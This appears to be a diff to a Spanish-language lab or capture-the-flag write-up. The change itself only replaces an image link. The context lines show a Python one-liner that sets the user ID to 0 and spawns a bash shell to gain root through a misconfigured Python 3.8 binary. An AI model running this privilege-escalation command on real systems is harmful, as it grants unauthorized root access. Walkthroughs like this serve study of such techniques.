@@ -58,6 +58,6 @@ python 3.8, así que podemos lanzar este comando para ser root
 
      python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-![[rooot.png]]
+![image](https://github.com/user-attachments/assets/7e3c623f-03dd-4e78-9230-e11cfeb2c7e5)
 
 y somos root! 
